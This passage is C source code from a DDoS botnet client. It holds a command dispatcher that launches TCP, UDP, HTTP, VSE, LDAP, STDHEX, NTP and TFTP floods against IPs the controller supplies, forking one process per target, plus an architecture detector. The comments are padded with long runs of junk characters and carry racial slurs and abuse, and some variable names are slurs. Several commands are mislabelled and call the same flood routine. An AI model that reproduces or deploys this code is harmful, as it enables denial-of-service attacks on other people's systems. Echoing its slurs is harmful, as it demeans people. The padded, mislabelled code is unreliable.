                if (socket != 0) {//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                    write(socket, request, strlen(request));//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                    read(socket, buffer, 1);//GFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                    close(socket);//GFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
                }
            }
           exit(0);
       }
    }
}
// Attacks Ends HERE
char *getArch() {
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "Arm4";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "Arm5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "Arm6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "Arm7";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "Mips";
    #elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "Mipsel";
    #elif defined(__sh__)
    return "Sh4";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "Ppc";
    #elif defined(__sparc__) || defined(__sparc)
    return "spc";
    #elif defined(__m68k__)
    return "M68k";
    #elif defined(__arc__)
    return "Arc";
    #else
    return "Unknown Architecture";
    #endif
}

char *getPortz()
{
        if(access("/usr/bin/python", F_OK) != -1){
        return "22";
        }
        if(access("/usr/bin/python3", F_OK) != -1){
        return "22";
        }
        if(access("/usr/bin/perl", F_OK) != -1){
        return "22";
        }
        if(access("/usr/sbin/telnetd", F_OK) != -1){
        return "22";
        } else {
        return "Unknown Port";
        }
}

int killer_pid;

void processCmd(int argc, unsigned char *argv[])
{
       if(!strcmp(argv[0], "TCP"))
        {
                if(argc < 6)
                {
                        
                        return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                unsigned char *flags = argv[5];

                int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
                int psize = argc > 6 ? atoi(argv[6]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        ftcp(hi, port, time, spoofed, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        ftcp(ip, port, time, spoofed, flags, psize, pollinterval);
                        _exit(0);
                }
        }
 if(!strcmp(argv[0], "UDP"))
		{
			if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 1024 || (argc == 6 && atoi(argv[5]) < 1))
			{
				return;
            }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int packetsize = atoi(argv[4]);
                int pollinterval = (argc == 6 ? atoi(argv[5]) : 10);
				int spoofed = 32;
                if(strstr(ip, ",") != NULL)
				{
					unsigned char *hi = strtok(ip, ",");
					while(hi != NULL)
					{
						if(!listFork())
						{
							SendUDP(hi, port, time, packetsize, pollinterval, spoofed);
							_exit(0);
						}
						hi = strtok(NULL, ",");
					}
                } else {
							if (listFork())
							{
								return;
							}
							SendUDP(ip, port, time, packetsize, pollinterval, spoofed);
							_exit(0);
					   }	
        }
		
		
		if (!strcmp(argv[0], "HTTPSTOMP"))
		{
			if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
			if (listFork()) return;
			SendHTTPHex(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
			sendHTTPtwo(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
			exit(0);
		}

		if(!strcmp(argv[0], "VSE")) {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
            return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            int packetsize = atoi(argv[5]);
            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
        return;
        }


if(!strcmp(argv[0], "LDAP")) {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
            return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            int packetsize = atoi(argv[5]);
            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
        return;
        }

        if(!strcmp(argv[0], "STDHEX"))
	    {
		if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
		{
			return;
		}
		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		if(strstr(ip, ",") != NULL)
		{
			unsigned char *niggas = strtok(ip, ",");
			while(niggas != NULL)
			{
				if(!listFork())
				{
					SendSTDHEX(niggas, port, time);
					_exit(0);
				}
				niggas = strtok(NULL, ",");
			}
		} else {
			if (listFork()) { return; }
			SendSTDHEX(ip, port, time);
			_exit(0);
		}
	}	//RyRdm9//

    if(!strcmp(argv[0], "NTP"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendSTDHEX(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendSTDHEX(ip, port, time);
            _exit(0);
        }
    }   //RyRdm9//

    if(!strcmp(argv[0], "TFTP"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendSTDHEX(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendSTDHEX(ip, port, time);
            _exit(0);
        }
    }   //RyRdm9//

